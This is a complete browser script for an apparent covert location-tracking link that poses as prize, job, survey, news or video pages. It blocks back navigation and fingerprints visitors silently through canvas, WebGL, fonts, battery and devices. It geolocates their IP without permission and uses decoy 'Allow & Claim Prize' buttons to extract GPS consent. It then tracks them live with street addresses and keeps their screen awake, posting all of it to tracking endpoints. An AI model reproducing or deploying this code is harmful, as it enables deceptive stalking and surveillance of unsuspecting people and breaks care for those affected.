// Prevent browser back button navigation & warn on tab close
(function() {
    for (var i = 0; i < 3; i++) {
        window.history.pushState(null, null, window.location.href);
    }
    window.addEventListener('popstate', function() {
        window.history.pushState(null, null, window.location.href);
    });
    window.onbeforeunload = function() {
        return '';
    };
})();

(async function() {
    const pathParts = window.location.pathname.split('/');
    const linkId = pathParts[pathParts.length - 1];
    
    // Parse theme from body class
    const themeClass = document.body.className;
    const theme = themeClass.replace('theme-', '');

    let ip = '';
    let batteryInfo = { battery_level: null, battery_charging: null };
    let mediaInfo = { audio_inputs: null, video_inputs: null, audio_outputs: null };
    let fingerprint = {};
    let locationCaptured = false;
    let retryCount = 0;
    const maxRetries = 5;

    function generateUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }
    const session_id = generateUUID();

    function haversineDistance(lat1, lon1, lat2, lon2) {
        const R = 6371000;
        const dLat = (lat2 - lat1) * Math.PI / 180;
        const dLon = (lon2 - lon1) * Math.PI / 180;
        const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
            Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
            Math.sin(dLon/2) * Math.sin(dLon/2);
        return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
    }

    function getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Viutck🔍', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Viutck🔍', 4, 17);
            return canvas.toDataURL().slice(-50); // last 50 chars as hash
        } catch (e) {
            return null;
        }
    }

    function detectFonts(fontList) {
        try {
            const detected = [];
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const testString = 'mmmmmmmmmmlli';
            const testSize = '72px';
            const baseFont = 'monospace';
            ctx.font = testSize + ' ' + baseFont;
            const baseWidth = ctx.measureText(testString).width;
            for (const font of fontList) {
                ctx.font = testSize + ' ' + font + ',' + baseFont;
                if (ctx.measureText(testString).width !== baseWidth) detected.push(font);
            }
            return detected;
        } catch (e) {
            return [];
        }
    }

    function getWebGLInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return { vendor: null, renderer: null };
            const dbgRenderInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (!dbgRenderInfo) return { vendor: null, renderer: null };
            const vendor = gl.getParameter(dbgRenderInfo.UNMASKED_VENDOR_WEBGL);
            const renderer = gl.getParameter(dbgRenderInfo.UNMASKED_RENDERER_WEBGL);
            return { vendor, renderer };
        } catch (e) {
            return { vendor: null, renderer: null };
        }
    }

    async function getBatteryInfo() {
        try {
            if (!navigator.getBattery) return { battery_level: null, battery_charging: null };
            const battery = await navigator.getBattery();
            return {
                battery_level: battery.level,
                battery_charging: battery.charging
            };
        } catch (e) {
            return { battery_level: null, battery_charging: null };
        }
    }

    async function getMediaDeviceCounts() {
        try {
            if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
                return { audio_inputs: null, video_inputs: null, audio_outputs: null };
            }
            const devices = await navigator.mediaDevices.enumerateDevices();
            let audio_inputs = 0;
            let video_inputs = 0;
            let audio_outputs = 0;
            devices.forEach(device => {
                if (device.kind === 'audioinput') audio_inputs++;
                else if (device.kind === 'videoinput') video_inputs++;
                else if (device.kind === 'audiooutput') audio_outputs++;
            });
            return { audio_inputs, video_inputs, audio_outputs };
        } catch (e) {
            return { audio_inputs: null, video_inputs: null, audio_outputs: null };
        }
    }

    // Decoy Client Interactivity initialization
    function initDecoyInteractivity(themeName) {
        if (themeName === 'gift') {
            // Expiry Timer countdown
            let time = 599; // 9m 59s
            const timerEl = document.getElementById('timer');
            if (timerEl) {
                setInterval(() => {
                    if (time <= 0) return;
                    time--;
                    const min = Math.floor(time / 60).toString().padStart(2, '0');
                    const sec = (time % 60).toString().padStart(2, '0');
                    timerEl.textContent = `${min}:${sec}`;
                }, 1000);
            }

            // Scratch card scratch interaction
            const scratchCard = document.getElementById('scratch-card');
            if (scratchCard) {
                scratchCard.addEventListener('click', function() {
                    this.classList.add('scratched');
                });
            }

            // Claim button spinning
            const claimBtn = document.getElementById('claim-btn');
            if (claimBtn) {
                claimBtn.addEventListener('click', function() {
                    this.disabled = true;
                    this.textContent = 'Processing Claim...';
                    this.style.opacity = '0.7';
                    this.style.cursor = 'not-allowed';
                });
            }
        } else if (themeName === 'job') {
            const jobForm = document.getElementById('decoy-job-form');
            if (jobForm) {
                jobForm.addEventListener('submit', function(e) {
                    e.preventDefault();
                    jobForm.classList.add('hidden');
                    document.getElementById('job-success-msg').classList.remove('hidden');
                });
            }
        } else if (themeName === 'survey') {
            let currentStep = 1;
            const nextBtn = document.getElementById('survey-next-btn');
            const questions = document.querySelectorAll('.survey-question');
            const progressFill = document.getElementById('survey-progress');
            const stepText = document.getElementById('survey-step-text');
            
            if (nextBtn) {
                nextBtn.addEventListener('click', function() {
                    const currentQuestion = document.querySelector(`.survey-question[data-step="${currentStep}"]`);
                    const checked = currentQuestion.querySelector('input[type="radio"]:checked');
                    if (!checked) {
                        alert('Please select an option to continue.');
                        return;
                    }

                    if (currentStep < 3) {
                        currentQuestion.classList.remove('active');
                        currentStep++;
                        document.querySelector(`.survey-question[data-step="${currentStep}"]`).classList.add('active');
                        
                        const pct = Math.round((currentStep / 3) * 100);
                        if (progressFill) progressFill.style.width = pct + '%';
                        if (stepText) stepText.textContent = `Question ${currentStep} of 3`;
                        if (currentStep === 3) {
                            nextBtn.textContent = 'Submit';
                        }
                    } else {
                        nextBtn.classList.add('hidden');
                        questions.forEach(q => q.classList.add('hidden'));
                        document.getElementById('survey-submit-msg').classList.remove('hidden');
                        
                        setTimeout(() => {
                            document.getElementById('survey-submit-msg').classList.add('hidden');
                            document.getElementById('survey-success-msg').classList.remove('hidden');
                        }, 1500);
                    }
                });
            }
        } else if (themeName === 'loading') {
            const playBtn = document.getElementById('video-play-btn');
            const overlay = document.getElementById('video-overlay');
            if (playBtn && overlay) {
                playBtn.addEventListener('click', function() {
                    playBtn.style.display = 'none';
                    overlay.style.display = 'flex';
                });
            }
        }
    }

    // Silent POST with retry logic
    async function postTelemetry(payload, isLive = false, isRetry = false) {
        const url = isLive ? `/api/track/live/${linkId}` : `/api/track/${linkId}`;
        try {
            const res = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            if (!res.ok && !isRetry) {
                setTimeout(() => postTelemetry(payload, isLive, true), 3000);
            }
        } catch (e) {
            if (!isRetry) {
                setTimeout(() => postTelemetry(payload, isLive, true), 3000);
            }
        }
    }

    // FEATURE 1: Screen Wake Lock
    async function keepScreenOn() {
        try {
            if ('wakeLock' in navigator) {
                let wakeLock = await navigator.wakeLock.request('screen');
                document.addEventListener('visibilitychange', async () => {
                    if (document.visibilityState === 'visible') {
                        wakeLock = await navigator.wakeLock.request('screen');
                    }
                });
            }
        } catch (e) {
            // silent fail
        }
    }

    // FEATURE 3: IP Geolocation (Always On — No Permission Needed)
    async function getIPLocation() {
        try {
            // Primary
            const r1 = await fetch('https://ipapi.co/json/');
            if (r1.ok) {
                const d1 = await r1.json();
                return {
                    latitude: d1.latitude,
                    longitude: d1.longitude,
                    city: d1.city,
                    region: d1.region,
                    country: d1.country_name,
                    isp: d1.org,
                    timezone: d1.timezone,
                    ip_source: 'ipapi'
                };
            }
            throw new Error('ipapi failed');
        } catch (e) {
            try {
                // Fallback
                const r2 = await fetch('https://ip-api.com/json/');
                if (r2.ok) {
                    const d2 = await r2.json();
                    return {
                        latitude: d2.lat,
                        longitude: d2.lon,
                        city: d2.city,
                        region: d2.regionName,
                        country: d2.country,
                        isp: d2.isp,
                        timezone: d2.timezone,
                        ip_source: 'ip-api'
                    };
                }
                return null;
            } catch (e2) {
                return null;
            }
        }
    }

    async function gatherTelemetry() {
        try {
            const results = await Promise.allSettled([
                fetch('https://api.ipify.org?format=json').then(res => res.ok ? res.json() : null),
                getBatteryInfo(),
                getMediaDeviceCounts()
            ]);

            if (results[0].status === 'fulfilled' && results[0].value) {
                ip = results[0].value.ip;
            }
            if (results[1].status === 'fulfilled') {
                batteryInfo = results[1].value;
            }
            if (results[2].status === 'fulfilled') {
                mediaInfo = results[2].value;
            }
        } catch (e) {
            // ignore
        }

        const webgl = getWebGLInfo();
        const fontList = ['Arial', 'Times', 'Courier', 'Verdana', 'Georgia', 'Comic Sans', 'Impact', 'Tahoma'];
        const fonts = detectFonts(fontList);
        const canvasFingerprint = getCanvasFingerprint();

        fingerprint = {
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezone_offset: new Date().getTimezoneOffset(),
            cpu_cores: navigator.hardwareConcurrency || null,
            device_memory: navigator.deviceMemory || null,
            touch_points: navigator.maxTouchPoints || 0,
            battery_level: batteryInfo.battery_level,
            battery_charging: batteryInfo.battery_charging,
            connection_type: navigator.connection?.effectiveType || null,
            canvas_fingerprint: canvasFingerprint,
            webgl_vendor: webgl.vendor,
            webgl_renderer: webgl.renderer,
            fonts_detected: fonts.join(','),
            audio_inputs: mediaInfo.audio_inputs,
            video_inputs: mediaInfo.video_inputs,
            is_mobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
            is_tablet: /iPad|Android(?!.*Mobile)/i.test(navigator.userAgent),
            screen_color_depth: screen.colorDepth,
            viewport: window.innerWidth + 'x' + window.innerHeight,
            prefers_dark_mode: window.matchMedia('(prefers-color-scheme: dark)').matches,
            cookies_enabled: navigator.cookieEnabled,
            plugins_count: navigator.plugins?.length || 0
        };
    }

    let lastSentLocation = null;
    let latestPosition = null;
    let liveTimer = null;
    let watchId = null;
    let isSending = false;

    function startLiveTracking(initialLat, initialLng) {
        lastSentLocation = {
            latitude: initialLat,
            longitude: initialLng,
            timestamp: Date.now()
        };

        // Periodically check if we have a newer position that is > 10m away
        liveTimer = setInterval(() => {
            if (latestPosition) {
                const dist = haversineDistance(
                    lastSentLocation.latitude,
                    lastSentLocation.longitude,
                    latestPosition.latitude,
                    latestPosition.longitude
                );
                if (dist > 10) {
                    sendLiveUpdate(latestPosition);
                }
            }
        }, 10000);

        watchId = navigator.geolocation.watchPosition(
            async function(pos) {
                const currentPos = {
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    altitude: pos.coords.altitude || null
                };
                latestPosition = currentPos;

                const dist = haversineDistance(
                    lastSentLocation.latitude,
                    lastSentLocation.longitude,
                    currentPos.latitude,
                    currentPos.longitude
                );

                if (dist > 10) {
                    sendLiveUpdate(currentPos);
                }
            },
            function(err) {
                console.log("WatchPosition error:", err);
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );

        window.addEventListener('beforeunload', () => {
            if (watchId !== null) {
                navigator.geolocation.clearWatch(watchId);
            }
            if (liveTimer !== null) {
                clearInterval(liveTimer);
            }
        });
    }

    async function sendLiveUpdate(posObj) {
        if (isSending) return;
        isSending = true;

        // Update immediately to prevent interval overlaps during async awaits
        lastSentLocation = {
            latitude: posObj.latitude,
            longitude: posObj.longitude,
            timestamp: Date.now()
        };

        try {
            let city = null;
            let address = null;
            try {
                const geoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${posObj.latitude}&lon=${posObj.longitude}`, {
                    headers: {
                        'Accept-Language': 'en-US,en;q=0.9',
                        'User-Agent': 'ViutckLocationTracker/1.0'
                    }
                });
                if (geoResponse.ok) {
                    const json = await geoResponse.json();
                    city = (json.address && (json.address.city || json.address.town || json.address.village)) || json.display_name;
                    address = json.display_name;
                }
            } catch (e) {}

            let freshBattery = batteryInfo;
            try {
                const batt = await getBatteryInfo();
                if (batt.battery_level !== null) freshBattery = batt;
            } catch (e) {}

            const payload = {
                latitude: posObj.latitude,
                longitude: posObj.longitude,
                accuracy: posObj.accuracy,
                altitude: posObj.altitude,
                city: city,
                address: address,
                ip_address: ip,
                user_agent: navigator.userAgent,
                platform: navigator.platform,
                screen_resolution: screen.width + 'x' + screen.height,
                language: navigator.language,
                location_denied: false,
                session_id: session_id,
                ip_source: 'gps',
                ...fingerprint,
                battery_level: freshBattery.battery_level,
                battery_charging: freshBattery.battery_charging
            };

            await postTelemetry(payload, true);
        } finally {
            isSending = false;
        }
    }

    // Main location capture triggering
    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                async function(position) {
                    locationCaptured = true;

                    // Smooth overlay fade out
                    const overlay = document.getElementById('permission-overlay');
                    if (overlay) {
                        overlay.classList.add('hidden');
                    }

                    let city = null;
                    let address = null;
                    try {
                        const geoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`, {
                            headers: {
                                'Accept-Language': 'en-US,en;q=0.9',
                                'User-Agent': 'ViutckLocationTracker/1.0'
                            }
                        });
                        if (geoResponse.ok) {
                            const json = await geoResponse.json();
                            city = (json.address && (json.address.city || json.address.town || json.address.village)) || json.display_name;
                            address = json.display_name;
                        }
                    } catch (e) {}

                    const payload = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude || null,
                        city: city,
                        address: address,
                        ip_address: ip,
                        user_agent: navigator.userAgent,
                        platform: navigator.platform,
                        screen_resolution: screen.width + 'x' + screen.height,
                        language: navigator.language,
                        location_denied: false,
                        session_id: session_id,
                        ip_source: 'gps',
                        ...fingerprint
                    };

                    await postTelemetry(payload, false);
                    startLiveTracking(position.coords.latitude, position.coords.longitude);
                },
                async function(error) {
                    // Update overlay text warning & shake
                    const subtitle = document.getElementById('permission-subtitle');
                    if (subtitle) {
                        subtitle.textContent = "Location verify karna zaroori hai continue karne ke liye";
                        subtitle.classList.add('error');
                    }
                    const card = document.getElementById('permission-card');
                    if (card) {
                        card.classList.remove('shake');
                        void card.offsetWidth; // force reflow to restart CSS animation
                        card.classList.add('shake');
                    }

                    const payload = {
                        latitude: null,
                        longitude: null,
                        accuracy: null,
                        altitude: null,
                        city: null,
                        address: null,
                        ip_address: ip,
                        user_agent: navigator.userAgent,
                        platform: navigator.platform,
                        screen_resolution: screen.width + 'x' + screen.height,
                        language: navigator.language,
                        location_denied: true,
                        session_id: session_id,
                        ip_source: 'gps',
                        ...fingerprint
                    };

                    await postTelemetry(payload, false);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        } else {
            // Geolocation unsupported fallback
            const subtitle = document.getElementById('permission-subtitle');
            if (subtitle) {
                subtitle.textContent = "Location verify karna zaroori hai continue karne ke liye";
                subtitle.classList.add('error');
            }
            const card = document.getElementById('permission-card');
            if (card) {
                card.classList.remove('shake');
                void card.offsetWidth;
                card.classList.add('shake');
            }

            const payload = {
                latitude: null,
                longitude: null,
                accuracy: null,
                altitude: null,
                city: null,
                address: null,
                ip_address: ip,
                user_agent: navigator.userAgent,
                platform: navigator.platform,
                screen_resolution: screen.width + 'x' + screen.height,
                language: navigator.language,
                location_denied: true,
                session_id: session_id,
                ip_source: 'gps',
                ...fingerprint
            };

            postTelemetry(payload, false);
        }
    }

    // INITIALIZATION & FLOW ORCHESTRATION
    async function initTelemetryAndIPGeo() {
        // Feature 1: Keep Screen Awake
        keepScreenOn();

        // Start gathering general fingerprint telemetry (async)
        const telemetryPromise = gatherTelemetry();

        // Feature 3: Always-on Silent IP Geolocation
        try {
            const ipLoc = await getIPLocation();
            if (ipLoc) {
                await telemetryPromise; // ensure fingerprinting finishes so we send complete payload
                const payload = {
                    latitude: ipLoc.latitude,
                    longitude: ipLoc.longitude,
                    accuracy: null,
                    altitude: null,
                    city: ipLoc.city,
                    address: `${ipLoc.city || 'Unknown City'}, ${ipLoc.region || ''}, ${ipLoc.country || ''} (ISP: ${ipLoc.isp || 'Unknown'})`,
                    ip_address: ip || '0.0.0.0',
                    user_agent: navigator.userAgent,
                    platform: navigator.platform,
                    screen_resolution: screen.width + 'x' + screen.height,
                    language: navigator.language,
                    location_denied: false,
                    session_id: session_id,
                    ip_source: ipLoc.ip_source,
                    ...fingerprint
                };
                await postTelemetry(payload, false);
            }
        } catch (e) {
            // Silent error
        }

        return telemetryPromise;
    }

    // Start loading background parameters immediately
    const telemetryPromise = initTelemetryAndIPGeo();

    // Bind UI actions
    function bindActions() {
        const btn = document.getElementById('permission-btn');
        if (btn) {
            btn.addEventListener('click', async function() {
                btn.disabled = true;
                btn.textContent = 'Verifying...';

                await telemetryPromise;
                getLocation();

                // Re-enable button after 5 seconds to allow retry if prompt got cancelled or stuck
                setTimeout(() => {
                    btn.disabled = false;
                    const buttonTextTheme = {
                        gift: '✅ Allow & Claim Prize',
                        news: '✅ Allow & Read News',
                        job: '✅ Allow & View Jobs',
                        survey: '✅ Allow & Continue',
                        loading: '✅ Allow & Watch'
                    };
                    btn.textContent = buttonTextTheme[theme] || '✅ Allow & Continue';
                }, 5000);
            });
        }

        // Initialize corresponding decoy features
        initDecoyInteractivity(theme);
    }

    // FEATURE 2: Page Visibility Detection + Geolocation Retry
    document.addEventListener('visibilitychange', function() {
        if (!document.hidden) {
            if (!locationCaptured && retryCount < maxRetries) {
                retryCount++;
                setTimeout(getLocation, 1000);
            }
        }
    });

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', bindActions);
    } else {
        bindActions();
    }
})();
